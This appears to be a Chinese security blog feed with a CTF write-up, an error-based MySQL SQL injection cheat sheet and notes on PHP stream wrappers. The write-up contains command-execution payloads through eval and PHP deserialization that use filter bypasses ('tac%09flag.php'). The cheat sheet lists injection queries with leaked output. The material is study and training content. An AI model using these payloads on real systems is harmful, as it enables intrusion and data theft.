<p><img src="http://obr4sfdq7.bkt.clouddn.com/xss2.png" alt=""></p>
<h2 id="PHP一句话"><a href="#PHP一句话" class="headerlink" title="PHP一句话"></a>PHP一句话</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="external">http://47.100.121.220:28002/02.php</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这个题目有点坑的，我自己也有点瞎的。在沈大佬的提醒下发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;a style=&quot;display:none&quot;&gt;password=style_is_display_none&lt;/a&gt;</div><div class="line">	&lt;form action=&quot;/02.php&quot; method=&quot;POST&quot;&gt;</div><div class="line">		Your password:&lt;input type=&quot;text&quot; name=&quot;password&quot; size=10 maxlength=6 /&gt;</div><div class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</div></pre></td></tr></table></figure>
<p>WTF,我审查元素没有注意，这里提示了password=style_is_display_none了，跟第三题一样没认真的看题。</p>
<p>遂构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password=style_is_display_none&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/password1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  if(isset($_POST[&quot;password&quot;])) &#123;</div><div class="line">    if(&quot;style_is_display_none&quot;===$_POST[&quot;password&quot;]) &#123;</div><div class="line">        echo &quot;Right!&quot;.&quot;&lt;/br&gt;&quot;;</div><div class="line">        show_source(__FILE__);</div><div class="line">        if(isset($_GET[1])) &#123;</div><div class="line">            eval($_GET[1]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        echo &quot;Wrong!&quot;.&quot;&lt;/br&gt;&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>看代码，我们可以利用eval来执行任意代码，执行system(“ls”)查看当前目录下的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?1=system(&quot;ls&quot;);</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/password2.png" alt=""></p>
<p>再用cat查看flag.php,这里貌似还是不能用cat，所以用tac吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?1=system(&quot;tac%09flag.php&quot;);</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/password3.png" alt=""></p>
<h2 id="PHP是最好的语言"><a href="#PHP是最好的语言" class="headerlink" title="PHP是最好的语言"></a>PHP是最好的语言</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>先用御剑扫目录发现 www.zip 文件，下载解压查看源码如下</p>
<p>function.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$xkey=&apos;xxxxxxx&apos;; #don&apos;t tell you.</div><div class="line"></div><div class="line">class Neo&#123;</div><div class="line">    public $cmd;</div><div class="line">    public $key;   </div><div class="line">    </div><div class="line">    function __construct($cmd,$key)&#123;</div><div class="line">        $this-&gt;cmd=$cmd;</div><div class="line">        $this-&gt;key=$key;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function __wakeup()&#123;        </div><div class="line">        $this-&gt;run();</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function run()&#123;</div><div class="line">        $this-&gt;waf();</div><div class="line">        global $xkey;</div><div class="line">        if ($this-&gt;key === $xkey)&#123;</div><div class="line">            system($this-&gt;cmd);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    </div><div class="line">    function waf()&#123;        </div><div class="line">        $black = array(&apos; &apos;,&apos;cat&apos;);</div><div class="line">        foreach ($black as $key =&gt; $value) &#123;</div><div class="line">            if(stripos($this-&gt;cmd,$value))&#123;</div><div class="line">                die(&quot;Attack!&quot;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>404.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;404.html&quot;;</div><div class="line">include &quot;function.php&quot;;</div><div class="line">@unserialize($_POST[&apos;power&apos;]);</div></pre></td></tr></table></figure></p>
<p>读源码可知这是一个php反序列化的题</p>
<p>php反序列化问题可以参考我之前的博客</p>
<p><a href="http://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">反序列化漏洞的利用与学习</a><br><a href="http://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">理解php序列化漏洞</a></p>
<p>可以在404.php页面用变量power提交payload，在function中的Neo类有两个成员变量，一个key，一个cmd。key值这个地方我一直以为是xxxxxxx，后来才看到index页面有提示Key值为php_is_nice</p>
<p>遂构造payload 先查看当前目录的文件，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">power=O:3:&quot;Neo&quot;:2:&#123;s:3:&quot;key&quot;;s:11:&quot;php_is_nice&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ls1.png" alt=""></p>
<p>可以看到存在flag.php文件 在由function的代码可以知道我们需要读flag.php的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function waf()&#123;        </div><div class="line">    $black = array(&apos; &apos;,&apos;cat&apos;);</div><div class="line">    foreach ($black as $key =&gt; $value) &#123;</div><div class="line">        if(stripos($this-&gt;cmd,$value))&#123;</div><div class="line">            die(&quot;Attack!&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>由waf函数可以知道，过滤了cat和空格。在这里我们可以用</p>
<p>%09 绕过空格 tac绕过cat</p>
<p>其中 空格绕过</p>
<p>参考<br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a></p>
<p>tac</p>
<p>cat命令可以显示文件的内容，它反过来写就是tac，而tac恰巧也是一个Linux命令，它的功能就是把文件内容反过来显示，文件内容的最后一行先显示，第一行最后显示</p>
<p>遂构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">power=O:3:&quot;Neo&quot;:2:&#123;s:3:&quot;key&quot;;s:11:&quot;php_is_nice&quot;;s:3:&quot;cmd&quot;;s:12:&quot;tac%09flag.php&quot;;&#125;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/tac.png" alt=""></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">反序列化漏洞的利用与学习</a><br><a href="http://uknowsec.cn/posts/notes/%E7%90%86%E8%A7%A3php%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">理解php序列化漏洞</a><br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="external">浅谈CTF中命令执行与绕过的小技巧</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL Error Based SQL Injection （报错注入）总结</title>
    <link href="http://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/notes/MySQL Error Based SQL Injection （报错注入）总结.html</id>
    <published>2017-11-17T08:42:00.000Z</published>
    <updated>2017-11-17T14:31:45.911Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="MySQL报错注入"><a href="#MySQL报错注入" class="headerlink" title="MySQL报错注入"></a>MySQL报错注入</h2><p>利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p>
<p>数据类型转换报错是最常见的一种方法，在微软SQL Server上，利用的是convert()和cast()函数，MySQL的报错SQL注入方式更多。</p>
<p>有很多函数都会导致MySQL报错并且显示出数据，它们分别是</p>
<ul>
<li>GemetryCollection()</li>
<li>polygon(),GTID_SUBSET()</li>
<li>multipoint()</li>
<li>multinestring()</li>
<li>multipolygon()</li>
<li>LINESTRING()</li>
<li>exp()</li>
</ul>
<p>MYSQL报错注入大体可以分为以下几类：</p>
<ul>
<li>BIGINT等数据类型溢出</li>
<li>xpath语法错误</li>
<li>concat+rand()+group_by()导致主键重复</li>
<li>空间数据类型函数错误</li>
</ul>
<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><h3 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div></pre></td></tr></table></figure>
<ul>
<li>floor：函数只返回整数部分，小数部分舍弃。</li>
<li>round：函数四舍五入，大于0.5的部分进位，不到则舍弃。</li>
</ul>
<h3 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><p>目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。</p>
<p>下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this:</div></pre></td></tr></table></figure>
<p>官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。</p>
<p>因此在mysql中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于Duplicate entry ‘…’ for key ‘group_key’的错误</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div><div class="line"></div><div class="line">1062 - Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</div><div class="line"></div><div class="line">1062 - Duplicate entry &apos;5.5.531&apos; for key &apos;group_key&apos;</div></pre></td></tr></table></figure>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
<h3 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</div></pre></td></tr></table></figure>
<h3 id="报错注入原理-1"><a href="#报错注入原理-1" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXTRACTVALUE (XML_document, XPath_string);</div></pre></td></tr></table></figure>
<ul>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
<li>第二个参数：XPath_string (Xpath格式的字符串). </li>
<li>作用：从目标XML中返回包含所查询值的字符串</li>
</ul>
<p>第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</div><div class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and (extractvalue(1,concat(0x7e,(select version()),0x7e)));</div><div class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</div></pre></td></tr></table></figure>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</p>
<p>因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。</p>
<h3 id="注入语句-2"><a href="#注入语句-2" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</div></pre></td></tr></table></figure>
<h3 id="报错注入原理-2"><a href="#报错注入原理-2" class="headerlink" title="报错注入原理"></a>报错注入原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATEXML (XML_document, XPath_string, new_value);</div></pre></td></tr></table></figure>
<ul>
<li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </li>
<li>第二个参数：XPath_string (Xpath格式的字符串)</li>
<li>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </li>
<li>作用：改变文档中符合条件的节点的值</li>
</ul>
<p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
<p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p>
<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</div><div class="line">1105 - XPATH syntax error: &apos;~root@localhost~&apos;</div><div class="line"></div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and (updatexml(1,concat(0x7e,(select version()),0x7e),1));</div><div class="line">1105 - XPATH syntax error: &apos;~5.5.53~&apos;</div></pre></td></tr></table></figure>
<h2 id="GemetryCollection-multipoint-polygon-multipolygon-linestring-multilinestring"><a href="#GemetryCollection-multipoint-polygon-multipolygon-linestring-multilinestring" class="headerlink" title="GemetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()"></a>GemetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()</h2><p>以上函数均为MySQL中的空间数据类型（存储）的函数</p>
<p>目前仅在MyISAM数据引擎下提供空间索引支持,要求几何字段非空</p>
<h3 id="注入语句-3"><a href="#注入语句-3" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</div><div class="line"></div><div class="line">select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</div></pre></td></tr></table></figure>
<h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and geometrycollection((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and multipoint((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and polygon((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and multipolygon((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and linestring((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div><div class="line"></div><div class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select user())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`user()` from (select &apos;root@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</div><div class="line">mysql&gt; select * from products where pid=1 and multilinestring((select * from(select * from(select version())a)b));</div><div class="line">1367 - Illegal non geometric &apos;(select `b`.`version()` from (select &apos;5.5.48&apos; AS `version()` from dual) `b`)&apos; value found during parsing</div></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。</p>
<p>利用exp函数也产生类似的溢出错误</p>
<h3 id="注入语句-4"><a href="#注入语句-4" class="headerlink" title="注入语句"></a>注入语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from products where pid=1 and exp(~(select * from(select user())a));</div></pre></td></tr></table></figure>
<h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from products where pid=1 and exp(~(select * from(select user())a));</div><div class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</div><div class="line"></div><div class="line">mysql&gt; select * from admin where id=1 and exp(~(select * from(select version())a));</div><div class="line">1690 - DOUBLE value is out of range in &apos;exp(~((select `a`.`version()` from (select version() AS `version()`) `a`)))&apos;</div></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://wooyun.jozxing.cc/static/drops/tips-14312.html" target="_blank" rel="external">Mysql报错注入原理分析(count()、rand()、group by)</a><br><a href="https://n0tr00t.com/2014/11/16/error-based-sql-injection.html" target="_blank" rel="external">Error Based SQL Injection</a><br><a href="https://edu.aqniu.com/article/54" target="_blank" rel="external">MYSQL报错注入的一点总结</a><br><a href="https://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="external">UpdateXml() MYSQL显错注入</a><br><a href="http://www.cnseay.com/4239/" target="_blank" rel="external">《代码审计：企业级Web代码安全架构》</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>php支持的协议和封装协议小结</title>
    <link href="http://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/notes/php支持的协议和封装协议小结.html</id>
    <published>2017-11-16T09:45:21.000Z</published>
    <updated>2017-11-16T14:44:10.154Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="php协议类型"><a href="#php协议类型" class="headerlink" title="php协议类型"></a>php协议类型</h2><ul>
<li>file:// — 访问本地文件系统</li>
<li>http:// — 访问 HTTP(s) 网址</li>
<li>ftp:// — 访问 FTP(s) URLs</li>
<li>php:// — 访问各个输入/输出流（I/O streams）</li>
<li>zlib:// — 压缩流</li>
<li>data:// — 数据（RFC 2397）</li>
<li>glob:// — 查找匹配的文件路径模式</li>
<li>phar:// — PHP 归档</li>
<li>ssh2:// — Secure Shell 2</li>
<li>rar:// — RAR</li>
<li>ogg:// — 音频流</li>
<li>expect:// — 处理交互式的流</li>
</ul>
<h2 id="PHP-ini"><a href="#PHP-ini" class="headerlink" title="PHP.ini"></a>PHP.ini</h2><ul>
<li>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</li>
<li>allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等</li>
</ul>
<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><p>file:// — 访问本地文件系统,不受allow_url_fopen与allow_url_include的影响</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/file1.png" alt=""></p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>file:// [文件的绝对路径和文件名]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/code/1.php?file=file:///E:\phpStudy\WWW\code\phpinfo.php</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/file2.png" alt=""></p>
<h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h2><p>php:// — 访问各个输入/输出流（I/O streams）</p>
<p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p>
<h3 id="php-stdin-php-stdout-和-php-stderr"><a href="#php-stdin-php-stdout-和-php-stderr" class="headerlink" title="php://stdin, php://stdout 和 php://stderr"></a>php://stdin, php://stdout 和 php://stderr</h3><p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。</p>
<p>php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。</p>
<h4 id="php-stdin"><a href="#php-stdin" class="headerlink" title="php://stdin"></a>php://stdin</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))</div><div class="line">    &#123;//open our file pointer to read from stdin</div><div class="line">        echo $line.&quot;\n&quot;;</div><div class="line">        echo fgets($line);//读取</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/stdin.png" alt=""></p>
<h4 id="php-stdout"><a href="#php-stdout" class="headerlink" title="php://stdout"></a>php://stdout</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $fd = fopen(&apos;php://stdout&apos;, &apos;w&apos;);</div><div class="line">    if ($fd) &#123;</div><div class="line">        echo $fd.&quot;\n&quot;;</div><div class="line">        fwrite($fd, &quot;test&quot;);</div><div class="line">        fwrite($fd, &quot;\n&quot;);</div><div class="line">        fclose($fd);</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/stdout.png" alt=""></p>
